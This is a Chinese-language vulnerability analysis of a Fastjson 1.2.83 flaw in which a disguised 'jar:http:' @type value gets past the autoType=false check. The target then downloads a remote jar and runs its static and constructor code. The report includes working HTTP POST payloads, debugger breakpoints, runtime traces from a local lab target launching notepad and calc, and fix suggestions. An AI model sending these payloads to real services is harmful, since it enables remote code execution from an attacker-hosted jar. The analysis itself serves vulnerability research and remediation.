# Fastjson 1.2.83 jar 协议远程类加载分析

## 1. Vulnerability overview

在 `autoTypeSupport=false`（1.2.83 默认）时，攻击者仍可通过 `@type` 传入形如
`jar:http:..host.port.EvilJar!.EvilClass` 的“伪类名”。`ParserConfig.checkAutoType`
为探测 `@JSONType` 会把 `.` 还原成 `/`，得到合法 jar URL，并调用
`ClassLoader.getResourceAsStream`。JDK `URLClassPath$Loader` 对带协议的绝对资源名执行
`new URL(base, name)`，从而发起对远程 jar 的 HTTP 下载。随后以 `jsonType=true` 绕过
autoType 关闭限制，再经 `TypeUtils.loadClass` → `ClassLoader.loadClass` 真正定义该类并实例化，触发静态块与构造方法。

## 2. Input artifacts and reproduction basis

| 证据面 | 内容 |
| --- | --- |
| HTTP 数据包 | 用户提供的 `POST /json` payload |
| 本地入口 | `com.vul.controller.JsonController#json` → `JSON.parse` |
| 依赖版本 | `com.alibaba:fastjson:1.2.83` |
| 恶意类 | `CalcJType`（`@JSONType` + static/`<init>` 中 `Runtime.exec`） |
| 远程 jar HTTP | `http://localhost:9192/CalcJType`（用户已就绪） |
| JDWP | `127.0.0.1:5005`（运行时验证） |
| 用户堆栈 | 指向 `checkAutoType:1502` → `TypeUtils.loadClass:1774` → `URLClassLoader.findClass` → `JarLoader.getResource` |

## 3. Impact conditions

- 应用调用 `JSON.parse` / `parseObject` 等开启 autoType 解析路径（本靶场为裸 `JSON.parse`）。
- `ParserConfig.safeMode == false`（运行时确认）。
- `autoTypeSupport` 可为 `false`：本链不依赖开启 autoType，而依赖 `@JSONType` 探测成功。
- 目标 JDK 的 `URLClassLoader`/`URLClassPath` 会对“带协议的资源名”解析为绝对 URL（JDK 8 已确认）。
- 攻击者可控一台可被目标访问的 HTTP 服务，提供恶意 jar。
- payload 用 `.` 代替 `/`，避免 autoType 黑名单对部分路径字符/前缀的命中，同时 `replace('.', '/')` 后仍能还原出合法 jar URL。

## 4. Functional view

```
HTTP POST /json
  → JsonController.json
  → JSON.parse
  → DefaultJSONParser.parseObject  (@type)
  → ParserConfig.checkAutoType(typeName)
       [1] 黑白名单哈希检查（jar: 伪类名未命中 deny）
       [2] getResourceAsStream(resource)  ★第一次下载远程 jar（探测 @JSONType）
       [3] jsonType=true → TypeUtils.loadClass(typeName)
       [4] TCCL.loadClass(伪类名) → findClass → 再次按 jar URL 取 class 字节并 defineClass
  → JavaBeanDeserializer.createInstance
       [5] <clinit> / <init> 执行恶意代码
```

## 5. Key code path

### 5.1 入口

```14:15:src/main/java/com/vul/controller/JsonController.java
        Object parse = JSON.parse(jsonStr);
        return "success";
```

### 5.2 checkAutoType：@JSONType 探测与放行

关键逻辑（fastjson 1.2.83 sources）：

1. `autoTypeSupport` 默认 false，`expectClass` 为 null → `expectClassFlag=false`。
2. 将 `typeName` 中 `.` 替换为 `/` 拼出 resource：
   - 输入：`jar:http:..localhost:9192.CalcJType!.CalcJType`
   - resource：`jar:http://localhost:9192/CalcJType!/CalcJType.class`
3. `getResourceAsStream(resource)` 读到字节后，`TypeCollector.hasJsonType()` 为 true。
4. 条件 `autoTypeSupport || jsonType || expectClassFlag` 成立，调用：
   `TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass=true)`（约 1502 行）。

### 5.3 TypeUtils.loadClass

`defaultClassLoader` 为 null 时，走线程上下文类加载器：

- 运行时 TCCL = `org.springframework.boot.loader.LaunchedURLClassLoader`
- 调用 `contextClassLoader.loadClass("jar:http:..localhost:9192.CalcJType!.CalcJType")`（约 1774 行）

### 5.4 JDK 侧：为何会请求远程 jar

`URLClassPath$Loader.findResource/getResource`（JDK 8）等价于：

```text
new URL(base, ParseUtil.encodePath(name, false)).openConnection()...
```

当 `name` 本身已是带协议的绝对 URL（`jar:http://...`）时，`URL(URL context, String spec)`
会生成绝对 jar URL，进而由 `JarURLConnection` 去拉 `http://host/jar`。

因此：**远程 jar 首次被加载/下载的时机，是 checkAutoType 的 @JSONType 探测，而不是等实例化。**

## 6. Reproduction process

1. 启动靶场：`java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar fastj-1.2.83-1.0-SNAPSHOT.jar`
2. 保证恶意 jar HTTP：`http://127.0.0.1:9192/CalcJType` 返回 200
3. 发送：

```http
POST /json HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{
  "@type": "jar:http:..localhost:9192.CalcJType!.CalcJType"
}
```

4. 期望：HTTP 200 `success`，并弹出 notepad（`<clinit>`）与 calc（`<init>`）。

注意：同一 JVM 内第二次相同 typeName 可能命中 `TypeUtils.mappings` 缓存，不再走远程加载。

## 7. HTTP request packet examples

```http
POST /json HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json

{"@type":"jar:http:..localhost:9192.CalcJType!.CalcJType"}
```

等价还原后的 jar URL：

```text
jar:http://localhost:9192/CalcJType!/CalcJType.class
内嵌 jar 文件 URL：http://localhost:9192/CalcJType
```

## 8. Runtime verification points

| 断点 | 目的 |
| --- | --- |
| `JsonController.json:14` | 确认入口与原始 body |
| `ParserConfig.checkAutoType` method entry | 确认 typeName / autoTypeSupport / safeMode |
| `ParserConfig.checkAutoType:1482` | resource 拼接前 |
| `JarURLConnection.connect` | **远程 jar 下载瞬间** |
| `ParserConfig.checkAutoType:1492/1500/1502` | jsonType 与 loadClass 放行 |
| `TypeUtils.loadClass:1774` | TCCL.loadClass(伪类名) |
| `URLClassLoader.findClass` | 类查找（用户堆栈对应点） |
| `Runtime.exec` | `<clinit>`/`<init>` 副作用 |

## 9. Actual verification results

JDWP 目标：`127.0.0.1:5005`，线程 `XNIO-1 task-1`。冷缓存重启后单次请求观测如下。

### 9.1 checkAutoType 入口

- `typeName` = `jar:http:..localhost:9192.CalcJType!.CalcJType`
- `expectClass` = null
- `autoTypeSupport` = false
- `safeMode` = false
- `TypeUtils.getClassFromMapping(typeName)` = null

### 9.2 @JSONType 探测（第一次拉 jar）

- 1482 行处构造 resource = `jar:http://localhost:9192/CalcJType!/CalcJType.class`
- 随即命中 `JarURLConnection.connect`
  - `getURL()` = `jar:http://localhost:9192/CalcJType!/CalcJType.class`
  - `jarFileURL` = `http://localhost:9192/CalcJType`
- 调用栈（摘要）：

```text
JarURLConnection.connect
  ← JarURLConnection.getInputStream
  ← URLClassPath$Loader.findResource
  ← URLClassPath.findResource
  ← URLClassLoader.findResource
  ← LaunchedURLClassLoader.findResource
  ← ClassLoader.getResource
  ← URLClassLoader.getResourceAsStream
  ← ParserConfig.checkAutoType:1486
  ← DefaultJSONParser.parseObject
  ← JSON.parse
  ← JsonController.json
```

- 1492 行：`visitor.hasJsonType() == true`，`is` 类型为 `JarURLConnection$JarURLInputStream`
- 1500 行：`autoTypeSupport=false, jsonType=true, expectClassFlag=false, cacheClass=true`

### 9.3 TypeUtils.loadClass / findClass（第二次按 jar URL 取类）

- 1502 → `TypeUtils.loadClass:1774`
  - `classLoader`（default）= null
  - `contextClassLoader` = `LaunchedURLClassLoader`
  - `className` 仍为伪类名 `jar:http:..localhost:9192.CalcJType!.CalcJType`
- `AppClassLoader.findClass` 将名字转成路径
  `jar:http://localhost:9192/CalcJType!/CalcJType.class`
- 用户给出的 `URLClassPath$JarLoader.getResource` 栈，对应 findClass 阶段在本地/已登记 jar loader 上按该资源名查找；最终仍通过 jar URL 机制拿到远程类字节。

### 9.4 初始化与实例化

1. `Runtime.exec("notepad")`
   - 类：`jar:http:..localhost:9192.CalcJType!.CalcJType`
   - 方法：`<clinit>`（CalcJType.java:18）
   - 由 `FastjsonASMDeserializer_1_CalcJType.createInstance` 首次主动使用触发类初始化
2. `Runtime.exec("calc")`
   - 同一类 `<init>`（CalcJType.java:9）
3. HTTP 响应：`200` / `success`

结论（运行时确认）：

- **远程 jar 下载发生在 `checkAutoType` 的 `getResourceAsStream` @JSONType 探测阶段。**
- **`TypeUtils.loadClass`/`findClass` 是第二次用同一 jar URL 语义完成 Class 定义。**
- **恶意代码执行发生在后续 createInstance：先 `<clinit>` 后 `<init>`。**

## 10. Patch or fix understanding

1.2.83 虽默认关闭 autoType，但保留了“classpath 上存在 `@JSONType` 则可加载”的例外。该例外假定 resource 名是普通 classpath 相对路径；未阻止 `jar:http:` / `jar:file:` 等绝对 URL 形态。修复方向通常包括：

- 禁止 typeName/resource 中出现 `:`、`/`、`\\`、`!` 等 URL/路径元字符；
- 对 `getResourceAsStream` 得到的流校验来源必须是本地 classpath，而不是任意 `URL.openConnection`；
- 或在 SafeMode / 更高版本中彻底收紧 autoType 与 expectClass/`@JSONType` 例外。

（本报告侧重运行时链路确认，不展开官方补丁 diff。）

## 11. Conclusion

该 payload 的核心不是“开启了 autoType”，而是：

1. 用 `.` 伪装 jar URL，骗过 checkAutoType 字符串/哈希检查；
2. `@JSONType` 探测阶段 `replace('.', '/')` 还原出真实 jar URL，**此时远程 jar 已被下载**；
3. `jsonType=true` 在 autoType 关闭时仍允许 `TypeUtils.loadClass`；
4. `ClassLoader.loadClass(伪类名)` 再次按 jar URL 定义类，Fastjson 实例化触发 static 与构造器。

用户堆栈中的 `JarLoader.getResource` 属于第二阶段 `findClass` 查找过程；**第一次远程加载的更准确断点是 `ParserConfig.checkAutoType` → `getResourceAsStream` → `JarURLConnection.connect`。**
